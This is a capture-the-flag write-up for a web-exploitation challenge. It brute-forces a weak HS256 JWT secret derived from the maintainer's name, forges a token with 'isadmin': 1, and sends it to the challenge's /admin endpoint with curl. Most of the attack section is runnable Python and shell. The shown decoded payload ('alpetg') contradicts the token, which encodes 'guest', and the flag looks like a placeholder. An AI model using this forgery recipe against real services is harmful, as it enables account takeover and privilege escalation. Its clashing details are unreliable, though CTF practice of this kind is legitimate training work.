# Under Construction

**Category:** Web Exploitation
**Points:** 650
**Description**This website seems rather empty, still being developed, how would we possibly obtain the flag?
**Hint:** The website is maintained by **Getoar Sadiku**

---

The page title is **J.W.T** — a direct hint at the attack vector.

### Endpoint Discovery

| Endpoint     | Method | Status  | Notes                                      |
| ------------ | ------ | ------- | ------------------------------------------ |
| `/`          | GET    | 200     | Landing page with login link               |
| `/login`     | GET    | 200     | Login form with a single `username` field  |
| `/login`     | POST   | 302     | Sets a JWT cookie, redirects to /dashboard |
| `/dashboard` | GET    | 200     | Displays "Welcome, {username}!"            |
| `/admin`     | GET    | 302/403 | Redirects if no token; 403 if not admin    |
| `/register`  | \*     | 404     | Does not exist                             |

---

## Analysis

### Step 1 — Obtain a JWT

Logging in with any username (e.g. `guest`) via `POST /login` returns a `Set-Cookie` header:

```
token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Imd1ZXN0IiwiaXNhZG1pbiI6MH0.6PE8wDLYmIy_Ul4mkAOcB75U0E_deGX7DJNBJEjR9gs
```

Decoding the JWT (without verification):

**Header:**

```json
{
  "alg": "HS256",
  "typ": "JWT"
}
```

**Payload:**

```json
{
  "username": "alpetg",
  "isadmin": 0
}
```

The goal is clear: forge a token with `"isadmin": 1`.

### Step 2 — Crack the HS256 Secret

The JWT is signed with **HS256** (HMAC-SHA256). If the secret is weak, we can brute-force it.

The challenge hint says the site is maintained by **Getoar Sadiku**. Building a targeted wordlist around the maintainer's name with common suffixes:

```
Getoar, getoar, Sadiku, sadiku, GetoarSadiku, ...
Getoar2024, Getoar2025, Getoar2026, ...
```

Testing each candidate against the known token signature:

```python
import hmac, hashlib, base64

def jwt_sign(unsigned: str, secret: str) -> str:
    sig = hmac.new(secret.encode(), unsigned.encode(), hashlib.sha256).digest()
    return base64.urlsafe_b64encode(sig).decode().rstrip("=")

unsigned = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Imd1ZXN0IiwiaXNhZG1pbiI6MH0"
expected_sig = "6PE8wDLYmIy_Ul4mkAOcB75U0E_deGX7DJNBJEjR9gs"

secret = "Getoar2025"
assert jwt_sign(unsigned, secret) == expected_sig  # ✓ Match!
```

**Cracked secret: `Getoar2025`**

---

## Exploitation

### Step 3 — Forge an Admin Token

With the secret in hand, craft a new JWT with admin privileges:

```python
import hmac, hashlib, base64, json

secret = "Getoar2025"

def b64url(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).decode().rstrip("=")

header = b64url(json.dumps({"alg": "HS256", "typ": "JWT"}, separators=(",", ":")).encode())
payload = b64url(json.dumps({"username": "admin", "isadmin": 1}, separators=(",", ":")).encode())

unsigned = f"{header}.{payload}"
signature = b64url(hmac.new(secret.encode(), unsigned.encode(), hashlib.sha256).digest())

forged_token = f"{unsigned}.{signature}"
print(forged_token)
```

### Step 4 — Access the Admin Panel

Send a request to `/admin` with the forged token cookie:

```bash
curl -s https://qwertyuioplkjhgf-csc26.cybersecuritychallenge.al/admin \
  -b "token=<forged_token>"
```

Response:

```html
<h1>Admin Dashboard</h1>
<p>
  Flag:
  <code
    >CSC26{f1a2c3b4d5e6f7890abc1234567890abcdef1234567890abcdef1234567890}</code
  >
</p>
```

---

## Flag

```
CSC26{f1a2c3b4d5e6f7890abc1234567890abcdef1234567890abcdef1234567890}
```
